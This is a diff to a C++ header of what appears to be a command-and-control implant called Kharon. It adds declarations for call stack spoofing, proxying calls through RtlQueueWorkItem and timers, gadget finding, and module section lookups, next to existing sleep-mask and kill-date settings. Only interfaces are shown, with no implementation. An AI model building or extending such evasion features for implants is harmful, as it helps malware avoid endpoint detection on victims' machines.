@@ -59,6 +59,10 @@ EXTERN_C UPTR EndPtr();
 #define KH_KILLDATE_ENABLED FALSE
 #endif // KH_KILLDATE_ENABLED
 
+#ifndef KH_PROXY_CALL
+#define KH_PROXY_CALL FALSE
+#endif // KH_PROXY_CALL
+
 #ifndef KH_CALL_STACK_SPOOF
 #define KH_CALL_STACK_SPOOF FALSE
 #endif // KH_CALL_STACK_SPOOF
@@ -536,6 +540,8 @@ namespace Root {
             DECLAPI( RtlReAllocateHeap );
             DECLAPI( RtlFreeHeap       );
     
+            DECLAPI( RtlQueueWorkItem );
+
             DECLAPI( RtlCreateTimer );
             DECLAPI( RtlDeleteTimer );
             DECLAPI( RtlCreateTimerQueue );
@@ -597,6 +603,8 @@ namespace Root {
             RSL_TYPE( RtlAllocateHeap   ),
             RSL_TYPE( RtlReAllocateHeap ),
             RSL_TYPE( RtlFreeHeap       ),
+
+            RSL_TYPE( RtlQueueWorkItem ),
 
             RSL_TYPE( RtlCreateTimer ),
             RSL_TYPE( RtlDeleteTimer ),
@@ -699,8 +707,10 @@ namespace Root {
             UPTR Handle;
 
             DECLAPI( CLRCreateInstance );
+            DECLAPI( LoadLibraryShim );
         } Mscoree = {
             RSL_TYPE( CLRCreateInstance ),
+            RSL_TYPE( LoadLibraryShim ),
         };
 
         struct {
@@ -781,13 +791,58 @@ typedef struct {
 	INT   size;     
 } FMTP, *PFMTP;
 
+struct _LOAD_CTX {
+    UPTR LoadLibraryAPtr;
+    UPTR LibraryName;
+};
+
+typedef _LOAD_CTX LOAD_CTX;
+
 class Spoof {
 private:
     Root::Kharon* Self;    
 public:
     Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
-    BOOL Enabled = KH_CALL_STACK_SPOOF;
+    BOOL Enabled   = KH_CALL_STACK_SPOOF;
+    BOOL ProxyCall = KH_PROXY_CALL;
+
+    struct {
+        UPTR FirstFrame;
+        UPTR SecondFrame;
+        UPTR JmpGadget;
+        UPTR ArgCount;
+    } Setup;
+
+    auto TimerCall(
+        _In_ UPTR Context,
+        _In_ INT8 Identifier
+    ) -> LONG;
+
+    auto WorkCall(
+        _In_ UPTR Context,
+        _In_ INT8 Identifier
+    ) -> LONG;
+
+    auto Call( 
+        _In_ UPTR Lib, 
+        _In_ UPTR Fnc, 
+        ... 
+    );
+
+    auto GetStackSize(
+        _In_ UPTR  LibBase,
+        _In_ PVOID UnwInfo
+    ) -> ULONG;
+
+    auto GetRtmEntry(
+        _In_ UPTR LibBase,
+        _In_ UPTR FncOffset
+    ) -> PIMAGE_RUNTIME_FUNCTION_ENTRY;
+
+    auto CalcFncStack(
+
+    );
 };
 
 class Coff {
@@ -1300,6 +1355,21 @@ public:
         _In_     BYTE*  Key, 
         _In_     SIZE_T KeySize 
     ) -> VOID;
+
+    auto FindGadget(
+        _In_ UPTR   ModuleBase,
+        _In_ UINT16 RegValue
+    ) -> UPTR;
+
+    auto SecVa(
+        _In_ UPTR LibBase,
+        _In_ UPTR SecHash
+    ) -> ULONG;
+
+    auto SecSize(
+        _In_ UPTR LibBase,
+        _In_ UPTR SecHash
+    ) -> ULONG;
 
     auto NtStatusToError(
         _In_ NTSTATUS NtStatus
@@ -1952,11 +2022,6 @@ public:
         .TechniqueID = KH_SLEEP_MASK,
         .Heap        = KH_HEAP_MASK
     };
-
-    auto FindGadget(
-        _In_ UPTR   ModuleBase,
-        _In_ UINT16 RegValue
-    ) -> UPTR;
 
     auto Main(
         _In_ ULONG Time
